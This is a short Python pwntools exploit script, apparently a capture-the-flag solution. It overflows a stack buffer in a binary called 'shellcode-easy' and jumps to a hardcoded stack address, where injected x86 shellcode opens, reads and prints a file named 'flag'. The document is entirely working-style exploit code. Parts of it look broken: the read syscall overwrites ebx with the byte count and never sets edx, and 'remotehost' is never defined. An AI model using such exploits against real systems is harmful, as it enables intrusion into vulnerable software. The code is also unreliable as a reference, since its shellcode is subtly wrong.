from pwn import *
#import pdb
exe = context.binary = ELF('shellcode-easy')


# sys_open() push 	0x2f2f2f2e   
shellcode = asm('''
		xor 	eax, eax
		push 	eax
		mov 	eax, 0x5
		push 	0x67616c66              
		mov 	ebx, esp
		xor	edx, edx
		int 	0x80
	''')
# sys_read()
shellcode += asm('''
		mov 	eax, 0x3
		mov 	ecx, ebx
		mov 	ebx, 0x3
		mov	ebx, 64
		int 	0x80
	''')
# sys_write()
shellcode += asm('''
		mov 	eax, 0x4
		mov 	ebx, 0x1
		int 0x80
	''')

gdbscript = """
"""

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            exe=exe.path, args=[exe.path] + argv,
            gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
        
context.log_level = 'debug'
io = start()
#ui.pause()

stack_addr = 0xffffd0a0


buff = b'A'*149 + p32(stack_addr) + shellcode
 
log.info(str(buff))

io.sendline(buff)

io.interactive()

